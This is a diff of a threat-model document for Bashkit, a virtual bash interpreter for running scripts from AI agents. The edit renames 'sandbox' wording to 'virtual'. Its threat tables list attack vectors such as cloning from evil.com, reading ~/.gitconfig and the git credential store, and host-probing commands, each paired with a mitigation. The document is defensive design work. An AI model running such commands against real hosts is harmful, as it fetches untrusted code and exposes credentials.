@@ -2,7 +2,7 @@
 
 ## Overview
 
-Bashkit is a sandboxed bash interpreter for multi-tenant environments, primarily designed for AI agent script execution. This document analyzes security threats and mitigations.
+Bashkit is a virtual bash interpreter for multi-tenant environments, primarily designed for AI agent script execution. This document analyzes security threats and mitigations.
 
 **Threat Actors**: Malicious or buggy scripts from untrusted sources (AI agents, users)
 **Assets**: Host CPU, memory, filesystem, network, secrets, other tenants
@@ -73,7 +73,7 @@ embedded in rustdoc. It contains:
 └───────────────────────────┼──────────────────────────────────┘
                             ▼
 ┌─────────────────────────────────────────────────────────────┐
-│                      SANDBOXED                               │
+│                      VIRTUAL                                  │
 │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
 │  │  Parser  │→ │Interpreter│→ │Virtual FS│  │ Network  │    │
 │  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
@@ -270,9 +270,9 @@ max_parser_operations: 100_000,         // Parser fuel (TM-DOS-024)
 - Script continues execution (unless `set -e`)
 
 **bash/sh Re-invocation** (TM-ESC-015): The `bash` and `sh` commands are handled
-specially to re-invoke the sandboxed interpreter rather than spawning external
+specially to re-invoke the virtual interpreter rather than spawning external
 processes. This enables common patterns while maintaining security:
-- `bash -c "cmd"` executes within the same sandbox constraints
+- `bash -c "cmd"` executes within the same virtual environment constraints
 - `bash script.sh` reads and interprets the script in-process
 - `bash --version` returns Bashkit version (never real bash info)
 - Resource limits and virtual filesystem are shared with parent
@@ -320,13 +320,13 @@ Bash::builder()
 
 | ID | Threat | Attack Vector | Mitigation | Status |
 |----|--------|--------------|------------|--------|
-| TM-INF-005 | Hostname | `hostname`, `$HOSTNAME` | Returns configurable sandbox value | **MITIGATED** |
-| TM-INF-006 | Username | `whoami`, `$USER` | Returns configurable sandbox value | **MITIGATED** |
+| TM-INF-005 | Hostname | `hostname`, `$HOSTNAME` | Returns configurable virtual value | **MITIGATED** |
+| TM-INF-006 | Username | `whoami`, `$USER` | Returns configurable virtual value | **MITIGATED** |
 | TM-INF-007 | IP address | `ip addr`, `ifconfig` | Not implemented | **MITIGATED** |
-| TM-INF-008 | System info | `uname -a` | Returns configurable sandbox values | **MITIGATED** |
+| TM-INF-008 | System info | `uname -a` | Returns configurable virtual values | **MITIGATED** |
 | TM-INF-009 | User ID | `id` | Returns hardcoded uid=1000 | **MITIGATED** |
 
-**Current Risk**: NONE - System builtins return configurable sandbox values (never real host info)
+**Current Risk**: NONE - System builtins return configurable virtual values (never real host info)
 
 **Implementation**: `builtins/system.rs` provides configurable system builtins:
 - `hostname` → configurable (default: "bashkit-sandbox")
@@ -634,7 +634,7 @@ fn validate_format(format: &str) -> Result<(), String> {
 
 ### 8. Git Security
 
-Bashkit provides optional sandboxed git operations via the `git` feature. This section documents
+Bashkit provides optional virtual git operations via the `git` feature. This section documents
 security threats related to git operations and their mitigations.
 
 #### 8.1 Repository Access
@@ -642,7 +642,7 @@ security threats related to git operations and their mitigations.
 | ID | Threat | Attack Vector | Mitigation | Status |
 |----|--------|--------------|------------|--------|
 | TM-GIT-001 | Unauthorized clone | `git clone https://evil.com/repo` | Remote URL allowlist (Phase 2) | **PLANNED** |
-| TM-GIT-002 | Host identity leak | Commit reveals real name/email | Configurable sandbox identity | **MITIGATED** |
+| TM-GIT-002 | Host identity leak | Commit reveals real name/email | Configurable virtual identity | **MITIGATED** |
 | TM-GIT-003 | Host git config access | Read ~/.gitconfig | No host filesystem access | **MITIGATED** |
 | TM-GIT-004 | Credential theft | Access git credential store | No host filesystem access | **MITIGATED** |
 | TM-GIT-005 | Repository escape | `git clone` outside VFS | All paths in VFS | **MITIGATED** |
